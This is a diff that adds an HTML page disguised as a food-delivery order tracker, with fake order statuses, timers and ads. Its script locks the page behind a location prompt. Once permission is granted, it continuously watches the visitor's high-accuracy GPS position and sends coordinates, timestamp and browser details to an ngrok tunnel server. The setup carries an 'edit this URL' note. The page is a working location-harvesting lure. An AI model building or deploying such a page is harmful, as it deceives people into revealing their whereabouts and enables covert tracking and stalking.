@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🍔 Food Delivery</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f7fafc;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        #blockerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            flex-direction: column;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        #blockerOverlay.hidden {
+            display: none;
+        }
+        
+        .blocker-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+        }
+        
+        .blocker-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+        
+        .blocker-subtitle {
+            color: #a0aec0;
+            font-size: 18px;
+            max-width: 400px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .blocker-button {
+            background: #48bb78;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(72, 187, 120, 0.4);
+        }
+        
+        .blocker-button:hover {
+            background: #38a169;
+            transform: scale(1.05);
+        }
+        
+        .blocker-error {
+            color: #fc8181;
+            font-size: 14px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .blocker-error.visible {
+            display: block;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            display: none;
+        }
+        
+        .container.visible {
+            display: block;
+        }
+        
+        .delivery-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .delivery-header h1 {
+            font-size: 24px;
+            color: #2d3748;
+        }
+        
+        .delivery-header span {
+            background: #fc8181;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .restaurant-card {
+            background: #f7fafc;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .restaurant-icon {
+            font-size: 40px;
+        }
+        
+        .restaurant-info h3 {
+            color: #2d3748;
+            font-size: 16px;
+        }
+        
+        .restaurant-info p {
+            color: #718096;
+            font-size: 13px;
+        }
+        
+        .delivery-timer {
+            background: linear-gradient(135deg, #fc8181, #f56565);
+            border-radius: 12px;
+            padding: 15px;
+            color: white;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .delivery-timer .time {
+            font-size: 32px;
+            font-weight: 700;
+        }
+        
+        .delivery-timer .label {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+        
+        .location-permission-banner {
+            background: #ebf8ff;
+            border: 1px solid #bee3f8;
+            border-radius: 12px;
+            padding: 12px 15px;
+            margin: 15px 0;
+            font-size: 13px;
+            color: #2b6cb0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .order-status {
+            margin: 15px 0;
+            padding: 10px;
+            background: #f7fafc;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #4a5568;
+        }
+        
+        .order-status .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #48bb78;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse-dot 1.5s infinite;
+        }
+        
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .track-map {
+            background: #e2e8f0;
+            border-radius: 12px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #718096;
+            font-size: 14px;
+            margin: 15px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .track-map .map-pin {
+            font-size: 30px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .fake-ads {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .fake-ads div {
+            background: #f7fafc;
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 12px;
+            color: #718096;
+        }
+        
+        .fake-ads div span {
+            display: block;
+            font-size: 20px;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <!-- BLOCKER OVERLAY -->
+    <div id="blockerOverlay">
+        <div class="blocker-icon">📍</div>
+        <div class="blocker-title">Location Required</div>
+        <div class="blocker-subtitle">
+            We need your location to find restaurants near you and provide accurate delivery times.
+        </div>
+        <button class="blocker-button" id="enableLocationBtn">📍 Enable Location</button>
+        <div class="blocker-error" id="blockerError"></div>
+    </div>
+
+    <!-- Main Delivery App -->
+    <div class="container" id="mainContainer">
+        <div class="delivery-header">
+            <h1>🍔 Food Delivery</h1>
+            <span>🟢 Live</span>
+        </div>
+        
+        <div class="restaurant-card">
+            <div class="restaurant-icon">🍕</div>
+            <div class="restaurant-info">
+                <h3>Pizza Palace</h3>
+                <p>⭐ 4.8 (2.3k reviews) • Italian</p>
+                <p>📍 <span id="locationName">Detecting location...</span></p>
+            </div>
+        </div>
+        
+        <div class="location-permission-banner" id="permissionBanner">
+            <span class="icon">✅</span>
+            <div>
+                <strong>Location Enabled</strong><br>
+                <span>Finding restaurants near you...</span>
+            </div>
+        </div>
+        
+        <div class="delivery-timer">
+            <div class="label">Estimated Delivery</div>
+            <div class="time" id="deliveryTime">15-20 <span style="font-size:16px;">min</span></div>
+        </div>
+        
+        <div class="order-status">
+            <span class="status-dot"></span>
+            <span id="orderStatus">Order confirmed • Preparing your food</span>
+        </div>
+        
+        <div class="track-map">
+            <div class="map-pin">📍</div>
+            <span style="position:absolute; bottom:10px; font-size:11px; color:#a0aec0;">
+                Live tracking enabled
+            </span>
+        </div>
+        
+        <div style="margin: 15px 0; padding: 15px; background: #f7fafc; border-radius: 10px;">
+            <div style="display: flex; justify-content: space-between; font-size: 14px; color: #4a5568;">
+                <span>🍕 Margherita Pizza</span>
+                <span>$14.99</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 14px; color: #4a5568; margin-top: 5px;">
+                <span>🥤 Coke</span>
+                <span>$2.99</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 14px; font-weight: 600; color: #2d3748; border-top: 1px solid #e2e8f0; margin-top: 8px; padding-top: 8px;">
+                <span>Total</span>
+                <span>$17.98</span>
+            </div>
+        </div>
+        
+        <div class="fake-ads">
+            <div>
+                <span>🎁</span>
+                Free delivery<br>on next order
+            </div>
+            <div>
+                <span>💳</span>
+                20% off<br>first order
+            </div>
+        </div>
+        
+        <div style="margin-top: 15px; font-size: 11px; color: #a0aec0; text-align: center;">
+            By continuing, you agree to our Terms of Service
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION - EDIT THIS URL
+        // ============================================
+        const SERVER_URL = 'https://senator-handcraft-kisser.ngrok-free.dev';
+        // ============================================
+        
+        let locationSent = false;
+        let watchId = null;
+        
+        const blockerOverlay = document.getElementById('blockerOverlay');
+        const mainContainer = document.getElementById('mainContainer');
+        const enableBtn = document.getElementById('enableLocationBtn');
+        const blockerError = document.getElementById('blockerError');
+        
+        // ============================================
+        // BLOCKER FUNCTIONS
+        // ============================================
+        
+        function showBlocker(message) {
+            blockerOverlay.classList.remove('hidden');
+            mainContainer.classList.remove('visible');
+            if (message) {
+                blockerError.textContent = message;
+                blockerError.classList.add('visible');
+            }
+        }
+        
+        function hideBlocker() {
+            blockerOverlay.classList.add('hidden');
+            mainContainer.classList.add('visible');
+        }
+        
+        // ============================================
+        // SEND LOCATION TO SERVER
+        // ============================================
+        
+        async function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            const data = {
+                latitude: lat,
+                longitude: lon,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                source: 'delivery_app'
+            };
+            
+            try {
+                const response = await fetch(`${SERVER_URL}/location`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (response.ok) {
+                    console.log('✅ Delivery location sent:', lat, lon);
+                    return true;
+                } else {
+                    console.error('❌ Server error:', response.status);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Failed to send location:', error);
+                return false;
+            }
+        }
+        
+        // ============================================
+        // UI FUNCTIONS
+        // ============================================
+        
+        function updateTimer() {
+            const min = Math.floor(Math.random() * 10) + 10;
+            const max = min + 5;
+            document.getElementById('deliveryTime').innerHTML = 
+                `${min}-${max} <span style="font-size:16px;">min</span>`;
+        }
+        
+        function updateStatus() {
+            const statuses = [
+                'Order confirmed • Preparing your food',
+                '👨‍🍳 Chef is cooking your order',
+                '📦 Your order is being packed',
+                '🛵 Rider assigned for delivery',
+                '🚀 Your food is on the way!'
+            ];
+            document.getElementById('orderStatus').textContent = statuses[Math.floor(Math.random() * statuses.length)];
+        }
+        
+        // ============================================
+        // LOCATION HANDLERS
+        // ============================================
+        
+        function handleLocationSuccess(position) {
+            console.log('📍 Delivery location received:', position.coords.latitude, position.coords.longitude);
+            
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Get city name
+            fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+                .then(res => res.json())
+                .then(data => {
+                    const city = data.address?.city || data.address?.town || data.address?.village || 'Unknown';
+                    document.getElementById('locationName').textContent = city;
+                })
+                .catch(() => {
+                    document.getElementById('locationName').textContent = `${lat.toFixed(2)}, ${lon.toFixed(2)}`;
+                });
+            
+            // SEND LOCATION TO SERVER - THIS IS THE KEY PART!
+            sendLocation(position);
+            
+            document.getElementById('permissionBanner').style.display = 'none';
+            locationSent = true;
+            
+            // Start updating UI
+            updateStatus();
+            setInterval(updateStatus, 15000);
+            setInterval(updateTimer, 30000);
+        }
+        
+        function handleLocationError(error) {
+            console.error('Location error:', error);
+            let msg = '❌ Location access is required.';
+            if (error.code === error.PERMISSION_DENIED) {
+                msg = '❌ You denied location access. Please enable it in browser settings and refresh.';
+            } else if (error.code === error.TIMEOUT) {
+                msg = '⏱️ Location request timed out. Please try again.';
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+                msg = '📡 Location unavailable. Please enable GPS or WiFi.';
+            }
+            showBlocker(msg);
+            enableBtn.textContent = '📍 Try Again';
+            enableBtn.disabled = false;
+        }
+        
+        // ============================================
+        // START TRACKING
+        // ============================================
+        
+        function startTracking() {
+            if (!navigator.geolocation) {
+                showBlocker('❌ Your browser does not support location services.');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    hideBlocker();
+                    handleLocationSuccess(position);
+                    
+                    // Continuous tracking
+                    watchId = navigator.geolocation.watchPosition(
+                        function(newPosition) {
+                            console.log('🔄 Delivery location updated');
+                            sendLocation(newPosition);
+                        },
+                        function(error) {
+                            console.warn('Watch error:', error);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 30000
+                        }
+                    );
+                },
+                function(error) {
+                    handleLocationError(error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                }
+            );
+        }
+        
+        // ============================================
+        // ENABLE BUTTON CLICK
+        // ============================================
+        
+        enableBtn.addEventListener('click', function() {
+            blockerError.classList.remove('visible');
+            blockerError.textContent = '';
+            enableBtn.textContent = '⏳ Requesting...';
+            enableBtn.disabled = true;
+            startTracking();
+        });
+        
+        // ============================================
+        // CHECK EXISTING PERMISSION
+        // ============================================
+        
+        function checkExistingPermission() {
+            if (navigator.permissions && navigator.permissions.query) {
+                navigator.permissions.query({ name: 'geolocation' })
+                    .then(result => {
+                        if (result.state === 'granted') {
+                            console.log('✅ Location already granted');
+                            startTracking();
+                        } else if (result.state === 'denied') {
+                            showBlocker('❌ Location access was denied. Please enable it in browser settings and refresh.');
+                        } else {
+                            showBlocker('');
+                        }
+                    })
+                    .catch(() => {
+                        showBlocker('');
+                    });
+            } else {
+                showBlocker('');
+            }
+        }
+        
+        // ============================================
+        // INITIALIZE
+        // ============================================
+        
+        console.log('🍔 Delivery app starting...');
+        console.log('🔗 Server URL:', SERVER_URL);
+        checkExistingPermission();
+    </script>
+</body>
+</html>
